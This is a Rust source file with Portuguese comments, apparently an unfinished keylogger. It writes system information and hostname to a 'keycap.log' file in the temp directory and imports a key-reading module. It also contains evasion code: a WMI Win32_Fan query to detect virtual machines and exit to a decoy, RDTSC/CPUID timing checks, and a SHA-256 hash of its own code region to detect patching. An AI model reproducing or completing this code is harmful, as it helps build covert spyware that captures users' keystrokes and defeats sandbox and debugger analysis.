use std::fs::OpenOptions;
//use std::thread;
//use std::time::Duration;
//use chrono::{format, prelude::*};
use std::io::Write;
use std::fs::File;
use std::collections::HashMap;
use wmi::{COMLibrary, WMIConnection, WMIResult, Variant};
use sha2::{Sha256, Digest};
use core::arch::x86_64::{__cpuid, _rdtsc};
mod leitura_tecla;

// precisa mudar dps para o hash da func depois de pronta
const EXPECTED: [u8;32] = [0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56];

// macro de erro
macro_rules! error {
    ($msg:expr, $($arg:expr), *) => {
        println!("[!] {}", format!($msg,$($arg),*))
    };
}
// ainda vou fazer um codigo caso esteja em uma vm, para rodar uma coisa legit
fn legit(){std::process::exit(1)}

fn info_basica(file: &mut File){
    // aq estou pegando as informações do sistema, como verssao, o tipo de sistema e entre outros.
    let info_so = {
        let info = os_info::get();
        format!("OS: {}\nVerssão: {}\n", info.os_type(), info.version())
    };

    log(file, info_so);

    let hostname_wrap = hostname::get();

    if hostname_wrap.is_ok(){log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()))}
    
    else {log(file, format!("Hostname: Erro"));}

}

fn log(file: &mut File, s:String){
    match file.write(s.as_bytes()){
        Err(err) => error!("Não foi possivel escrever no arquivo erro= {}", err),
        _ => {},
    }

    match file.flush(){
        Err(err) => {error!("Erro a dar flush para escrever no arquivo erro= {}",err)},
        _=> {}
    }
}

// fn() é um function pointer (ponteiro de função)
// isso não executa a função.
// isso recebe o endereço dela.
fn get_fn_addr(f: fn()) -> usize {
    // ponteiro -> número inteiro
    f as usize
}

fn ciclos() -> u64 {
    // registrador chamado TSC (Time Stamp Counter)
    unsafe { _rdtsc() }
}

fn calcula_ciclos() -> u64 {
    let start = ciclos();
    __cpuid(0); // pergunta info da CPU    
    let end = ciclos();
    end - start
}

fn hash_protected_region() -> Vec<u8> {
    // as fn() é dizer para tratar essa função como um ponteiro de função simples
    let start = get_fn_addr(integrity_start as fn());
    let end   = get_fn_addr(integrity_end as fn());

    let size = end - start;

    // start tem um numero, q é o endereco da func inicial, q esta em numero, e a gente muda para ponteiro dnv, e ate o tamanho q tem o size, para saber quanto ele 
    // tem q andar 
    // ent aq temos um vec, slice de um ponteiro inicial até o tamanho q passei, ent temos os by em MM 
    // e dps vms tirar hash para saber se alg mudou alg coisa
    let bytes = unsafe {
        std::slice::from_raw_parts(start as *const u8, size)
    };

    // intancia...
    let mut hasher = Sha256::new();
    hasher.update(bytes);
    let hash = hasher.finalize().to_vec(); 
    println!("{:?}",&hash);
    hash
}
//Impede o compilador de, remover, mover
#[inline(never)]
//Impede renomeação do símbolo, garante que exista endereço fixo na .text
#[unsafe(no_mangle)]
pub fn integrity_start() {}

#[inline(never)]
fn check_vm() -> WMIResult<()>{
    
    let com_lib = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_lib)?;

    let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query("SELECT * FROM Win32_Fan")?;

     if results.is_empty(){
        legit();
    }

    Ok(())
}

#[inline(never)]
#[unsafe(no_mangle)] // garante que o símbolo exista no binário.
pub fn integrity_end() {}

fn verify_function_integrity() {
    let current = hash_protected_region();

    if current != EXPECTED {
        //println!("Function patched!");
        legit();
    }
}

fn main() {
    
    let temp_path = std::env::temp_dir();
    let filename = temp_path.join("keycap.log");

    let mut output = OpenOptions::new()
        .write(true)
        .create(true)
        .open(filename)
        .expect("erro ao criar arquivo");

    info_basica(&mut output);
    
}